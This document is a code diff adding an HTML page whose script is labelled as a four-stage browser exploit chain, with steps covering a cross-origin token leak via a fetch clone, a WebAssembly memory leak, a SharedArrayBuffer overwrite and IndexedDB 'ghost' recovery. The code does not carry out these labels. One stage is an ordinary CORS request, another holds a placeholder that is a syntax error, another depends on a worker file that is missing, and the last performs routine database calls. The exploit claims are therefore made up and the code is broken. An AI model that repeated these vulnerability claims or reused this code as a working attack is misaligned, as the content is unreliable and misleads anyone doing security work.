@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// STAGE 1: Cross-origin fetch clone leak
+(async () => {
+  const url = "https://example.com/token.json";
+  const res = await fetch(url, {mode: "cors"});
+  const clone = res.clone();
+  res.body.cancel();
+  const leaked = await clone.text();
+  console.log("Stage 1 Leak:", leaked);
+})();
+
+// STAGE 2: Wasm struct RTT leak (symbolic only)
+const wasmCode = new Uint8Array([...]);  // Placeholder
+WebAssembly.instantiate(wasmCode).then(result => {
+  console.log("Stage 2 Wasm Memory Accessed (symbolic)");
+});
+
+// STAGE 3: SAB overwrite setup
+const sab = new SharedArrayBuffer(64);
+const i32 = new Int32Array(sab);
+i32[0] = 0;
+const worker = new Worker("sab-worker.js");
+worker.postMessage(sab);
+
+// STAGE 4: IndexedDB ghost recovery
+const req = indexedDB.open("ZeroChainDB", 1);
+req.onupgradeneeded = e => {
+  const db = e.target.result;
+  db.createObjectStore("ghosts");
+};
+req.onsuccess = e => {
+  const db = e.target.result;
+  const tx = db.transaction("ghosts", "readwrite");
+  const store = tx.objectStore("ghosts");
+  store.put("phantom", "key");
+  store.delete("key");
+  store.get("key").onsuccess = e => console.log("Stage 4 Ghost:", e.target.result);
+};
+</script>
+</body>
+</html>
